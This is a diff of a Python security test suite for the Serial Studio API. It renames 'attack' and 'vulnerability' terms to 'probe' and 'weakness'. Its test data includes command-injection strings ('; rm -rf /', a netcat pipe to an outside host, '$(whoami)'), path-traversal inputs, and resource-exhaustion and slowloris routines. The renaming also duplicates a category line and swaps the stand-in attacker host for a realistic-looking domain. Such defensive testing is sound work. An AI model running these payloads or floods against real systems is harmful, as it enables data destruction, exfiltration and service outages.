@@ -2,16 +2,16 @@
 """
 API Security Testing Suite for Serial Studio
 
-This test suite attempts to exploit vulnerabilities in the Serial Studio API
-to verify security hardening and identify potential attack vectors.
+This test suite attempts to probe weaknesses in the Serial Studio API
+to verify security hardening and identify potential probe vectors.
 
-Attack categories:
+Probe categories:
 - Input validation bypass
-- JSON parsing exploits
+- JSON parsing probes
 - Buffer overflow/exhaustion
 - Command injection
 - Path traversal
-- DoS attacks
+- Resource_exhaustion probes
 - Resource exhaustion
 
 Copyright (C) 2020-2025 Alex Spataru
@@ -37,31 +37,31 @@ class SecurityTester:
     def __init__(self, host="127.0.0.1", port=7777):
         self.host = host
         self.port = port
-        self.vulnerabilities = []
+        self.weaknesses = []
 
-    def log_vulnerability(self, severity, category, description, payload=None):
-        """Log a discovered vulnerability"""
-        vuln = {
+    def log_weakness(self, severity, category, description, payload=None):
+        """Log a discovered weakness"""
+        finding = {
             "severity": severity,  # CRITICAL, HIGH, MEDIUM, LOW, INFO
             "category": category,
             "description": description,
             "payload": payload,
         }
-        self.vulnerabilities.append(vuln)
+        self.weaknesses.append(finding)
         print(f"[{severity}] {category}: {description}")
         if payload:
             print(f"  Payload: {repr(payload)[:200]}")
 
     def report(self):
-        """Generate vulnerability report"""
+        """Generate weakness report"""
         print("\n" + "=" * 80)
         print("SECURITY TEST REPORT")
         print("=" * 80)
-        print(f"Total issues found: {len(self.vulnerabilities)}")
+        print(f"Total issues found: {len(self.weaknesses)}")
 
         by_severity = {}
-        for vuln in self.vulnerabilities:
-            sev = vuln["severity"]
+        for finding in self.weaknesses:
+            sev = finding["severity"]
             by_severity[sev] = by_severity.get(sev, 0) + 1
 
         for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
@@ -70,14 +70,14 @@ class SecurityTester:
                 print(f"  {severity}: {count}")
 
         print("\nDetailed findings:")
-        for i, vuln in enumerate(self.vulnerabilities, 1):
-            print(f"\n{i}. [{vuln['severity']}] {vuln['category']}")
-            print(f"   {vuln['description']}")
+        for i, finding in enumerate(self.weaknesses, 1):
+            print(f"\n{i}. [{finding['severity']}] {finding['category']}")
+            print(f"   {finding['description']}")
 
 
-def test_json_parsing_exploits(tester):
-    """Test JSON parsing vulnerabilities"""
-    print("\n[*] Testing JSON parsing exploits...")
+def test_json_parsing_probes(tester):
+    """Test JSON parsing weaknesses"""
+    print("\n[*] Testing JSON parsing probes...")
 
     with SerialStudioClient() as client:
         # Test 1: Deeply nested JSON (potential stack overflow)
@@ -93,7 +93,7 @@ def test_json_parsing_exploits(tester):
 
             # If server doesn't crash, check response
             if b"error" not in response.lower():
-                tester.log_vulnerability(
+                tester.log_weakness(
                     "HIGH",
                     "JSON Parsing",
                     "Server accepts deeply nested JSON without depth limit",
@@ -118,7 +118,7 @@ def test_json_parsing_exploits(tester):
             sock.settimeout(2.0)
             response = sock.recv(65536)
             sock.close()
-            tester.log_vulnerability(
+            tester.log_weakness(
                 "MEDIUM",
                 "JSON Parsing",
                 "Server accepts extremely large JSON payloads (100MB+)",
@@ -145,7 +145,7 @@ def test_json_parsing_exploits(tester):
                 sock.close()
 
                 if b"error" not in response.lower() and len(response) > 0:
-                    tester.log_vulnerability(
+                    tester.log_weakness(
                         "MEDIUM",
                         "Input Validation",
                         "Server processes JSON with control characters",
@@ -154,18 +154,18 @@ def test_json_parsing_exploits(tester):
             except (socket.timeout, ConnectionError, UnicodeDecodeError):
                 pass
 
-        # Test 4: Unicode normalization attack
-        print("  - Testing Unicode normalization attacks...")
-        unicode_attacks = [
+        # Test 4: Unicode normalization probe
+        print("  - Testing Unicode normalization probes...")
+        unicode_probes = [
             "api\u200b.getCommands",  # Zero-width space
             "api\u202egetCommands",  # Right-to-left override
             "api\ufeffgetCommands",  # Zero-width no-break space
         ]
 
-        for cmd in unicode_attacks:
+        for cmd in unicode_probes:
             try:
                 result = client.command(cmd)
-                tester.log_vulnerability(
+                tester.log_weakness(
                     "LOW",
                     "Unicode Handling",
                     f"Command accepted with Unicode control chars: {repr(cmd)}",
@@ -176,8 +176,8 @@ def test_json_parsing_exploits(tester):
 
 
 def test_command_injection(tester):
-    """Test command injection vulnerabilities"""
-    print("\n[*] Testing command injection attacks...")
+    """Test command injection weaknesses"""
+    print("\n[*] Testing command injection probes...")
 
     with SerialStudioClient() as client:
         # Test 1: Path traversal in file operations
@@ -194,7 +194,7 @@ def test_command_injection(tester):
         for payload in path_traversal_payloads:
             try:
                 client.command("project.open", {"filePath": payload})
-                tester.log_vulnerability(
+                tester.log_weakness(
                     "CRITICAL",
                     "Path Traversal",
                     f"Server attempted to open file outside project dir: {payload}",
@@ -210,7 +210,7 @@ def test_command_injection(tester):
         print("  - Testing command injection in string parameters...")
         injection_payloads = [
             "; rm -rf /",
-            "| nc attacker.com 4444",
+            "| nc client.com 4444",
             "$(whoami)",
             "`id`",
             "${USER}",
@@ -237,20 +237,20 @@ def test_command_injection(tester):
                 if "0x" in response_str or any(
                     c in response_str for c in ["\x00", "\xff"]
                 ):
-                    tester.log_vulnerability(
+                    tester.log_weakness(
                         "HIGH",
                         "Format String",
-                        "Format string vulnerability may exist",
+                        "Format string weakness may exist",
                         payload,
                     )
-                    pytest.fail(f"Format string vulnerability may exist: {payload}")
+                    pytest.fail(f"Format string weakness may exist: {payload}")
             except APIError:
                 pass
 
 
 def test_buffer_exhaustion(tester):
-    """Test buffer overflow and exhaustion attacks"""
-    print("\n[*] Testing buffer exhaustion attacks...")
+    """Test buffer overflow and exhaustion probes"""
+    print("\n[*] Testing buffer exhaustion probes...")
 
     # Test 1: Send data without newlines to exhaust line buffer
     print("  - Testing line buffer exhaustion (no newlines)...")
@@ -271,7 +271,7 @@ def test_buffer_exhaustion(tester):
         sock.close()
 
         if response:
-            tester.log_vulnerability(
+            tester.log_weakness(
                 "HIGH",
                 "Buffer Exhaustion",
                 "Server buffered 100MB without newline, potential memory exhaustion",
@@ -305,7 +305,7 @@ def test_buffer_exhaustion(tester):
         print(f"    Sent 1000 messages in {elapsed:.2f}s ({rate:.0f} msg/s)")
 
         if elapsed < 5.0:
-            tester.log_vulnerability(
+            tester.log_weakness(
                 "MEDIUM",
                 "Rate Limiting",
                 f"No rate limiting detected: {rate:.0f} msg/s sustained",
@@ -333,7 +333,7 @@ def test_batch_abuse(tester):
             if isinstance(results, dict) and results.get("error"):
                 print(f"    Server rejected batch: {results.get('message')} (GOOD)")
             elif isinstance(results, list) and len(results) > 0:
-                tester.log_vulnerability(
+                tester.log_weakness(
                     "MEDIUM",
                     "Batch Processing",
                     f"Server processed {len(results)} commands in {elapsed:.2f}s without limit",
@@ -378,7 +378,7 @@ def test_connection_exhaustion(tester):
         print(f"    Opened {len(sockets)} connections successfully")
 
         if len(sockets) > 50:
-            tester.log_vulnerability(
+            tester.log_weakness(
                 "LOW",
                 "Connection Limit",
                 f"No connection limit: opened {len(sockets)} simultaneous connections",
@@ -394,8 +394,8 @@ def test_connection_exhaustion(tester):
             except:
                 pass
 
-    # Test 2: Slowloris attack (slow header sending)
-    print("  - Testing slowloris attack...")
+    # Test 2: Slowloris probe (slow header sending)
+    print("  - Testing slowloris probe...")
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((tester.host, tester.port))
@@ -411,18 +411,18 @@ def test_connection_exhaustion(tester):
         sock.close()
 
         if response:
-            tester.log_vulnerability(
+            tester.log_weakness(
                 "MEDIUM",
                 "Slowloris",
                 "Server accepts very slow data transmission (10 bytes/sec)",
-                "Slowloris timing attack",
+                "Slowloris timing probe",
             )
     except (socket.timeout, ConnectionError):
         print("    Connection timed out (GOOD)")
 
 
 def test_raw_data_injection(tester):
-    """Test raw data injection attacks"""
+    """Test raw data injection probes"""
     print("\n[*] Testing raw data injection...")
 
     with SerialStudioClient() as client:
@@ -432,9 +432,9 @@ def test_raw_data_injection(tester):
         except:
             pass
 
-        # Test 1: Inject malicious base64 data
-        print("  - Testing malicious base64 payloads...")
-        malicious_payloads = [
+        # Test 1: Inject untrusted base64 data
+        print("  - Testing untrusted base64 payloads...")
+        untrusted_payloads = [
             b"\x00" * 10000,  # NULL bytes
             b"\xff" * 10000,  # Max bytes
             b"\x00\x01\x02\x03" * 2500,  # Binary data
@@ -442,7 +442,7 @@ def test_raw_data_injection(tester):
             b"\r\n" * 5000,  # Line feed injection
         ]
 
-        for payload in malicious_payloads:
+        for payload in untrusted_payloads:
             import base64
 
             encoded = base64.b64encode(payload).decode()
@@ -475,7 +475,7 @@ def test_parameter_validation(tester, check_server_alive):
         pytest.skip("Server unresponsive after preceding stress tests")
 
     with SerialStudioClient() as client:
-        # Test 1: Type confusion attacks
+        # Test 1: Type confusion probes
         print("  - Testing type confusion...")
         type_confusion = [
             {"command": "dashboard.setFps", "params": {"fps": "not_a_number"}},
@@ -490,7 +490,7 @@ def test_parameter_validation(tester, check_server_alive):
         for test_case in type_confusion:
             try:
                 result = client.command(test_case["command"], test_case["params"])
-                tester.log_vulnerability(
+                tester.log_weakness(
                     "LOW",
                     "Type Validation",
                     f"Command {test_case['command']} accepted wrong type: {test_case['params']}",
@@ -505,7 +505,7 @@ def test_parameter_validation(tester, check_server_alive):
         try:
             # Command that requires params
             result = client.command("dashboard.setFps", {})
-            tester.log_vulnerability(
+            tester.log_weakness(
                 "LOW",
                 "Parameter Validation",
                 "Command accepted empty params object",
@@ -523,7 +523,7 @@ def test_parameter_validation(tester, check_server_alive):
                     "unexpected": "parameter",
                     "admin": True,
                     "bypass": True,
-                    "exec": "malicious",
+                    "exec": "untrusted",
                 },
             )
             # Check if extra params are silently ignored or cause issues
@@ -533,7 +533,7 @@ def test_parameter_validation(tester, check_server_alive):
 
 
 def test_information_disclosure(tester):
-    """Test information disclosure vulnerabilities"""
+    """Test information disclosure weaknesses"""
     print("\n[*] Testing information disclosure...")
 
     with SerialStudioClient() as client:
@@ -554,7 +554,7 @@ def test_information_disclosure(tester):
                     "trace",
                 ]
             ):
-                tester.log_vulnerability(
+                tester.log_weakness(
                     "LOW",
                     "Information Disclosure",
                     f"Error message leaks info: {e.message}",
@@ -581,7 +581,7 @@ def test_information_disclosure(tester):
                 cmd_name = cmd_info.get("name", "")
                 for pattern in dangerous_patterns:
                     if pattern in cmd_name.lower():
-                        tester.log_vulnerability(
+                        tester.log_weakness(
                             "INFO",
                             "API Design",
                             f"Potentially dangerous command exposed: {cmd_name}",
@@ -592,7 +592,7 @@ def test_information_disclosure(tester):
 
 
 def test_state_manipulation(tester):
-    """Test state manipulation attacks"""
+    """Test state manipulation probes"""
     print("\n[*] Testing state manipulation...")
 
     with SerialStudioClient() as client:
@@ -645,7 +645,7 @@ def main():
     print("=" * 80)
     print("Serial Studio API Security Test Suite")
     print("=" * 80)
-    print("\nWARNING: This will attempt to exploit the Serial Studio API.")
+    print("\nWARNING: This will attempt to probe the Serial Studio API.")
     print("Only run this against a test instance!")
     print()
 
@@ -656,8 +656,8 @@ def main():
         with SerialStudioClient() as client:
             print("[+] Connected to Serial Studio API\n")
 
-        # Run all attack categories
-        test_json_parsing_exploits(tester)
+        # Run all probe categories
+        test_json_parsing_probes(tester)
         test_command_injection(tester)
         test_buffer_exhaustion(tester)
         test_batch_abuse(tester)
